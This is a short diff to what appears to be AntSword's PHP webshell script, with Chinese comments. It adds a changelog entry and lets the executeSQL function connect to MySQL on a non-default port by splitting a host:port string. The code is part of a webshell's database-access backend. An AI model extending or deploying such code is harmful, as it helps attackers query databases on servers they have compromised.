@@ -24,6 +24,9 @@
 *  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 *
 * ChangeLog:
+*   Date: 2019/05/22 v1.3
+*    1. 支持 mysqli 连接非默认端口
+*
 *   Date: 2019/04/05 v1.2
 *    1. 新增 listcmd 接口
 *    2. 新增数据库支持函数检查接口
@@ -135,7 +138,9 @@ function executeSQL($encode, $conf, $sql, $columnsep, $rowsep, $needcoluname){
         $password = $data[1];    
     }
     $encode = decode(EC($encode));
-    $conn = @mysqli_connect($host, $user, $password);
+    $port=split(":",$host)[1];
+    $host=split(":",$host)[0];
+    $conn = @mysqli_connect($host, $user, $password, "", $port);
     $res = @mysqli_query($conn, $sql);
     if (is_bool($res)) {
         return "Status".$columnsep.$rowsep.($res?"True":"False").$columnsep.$rowsep;
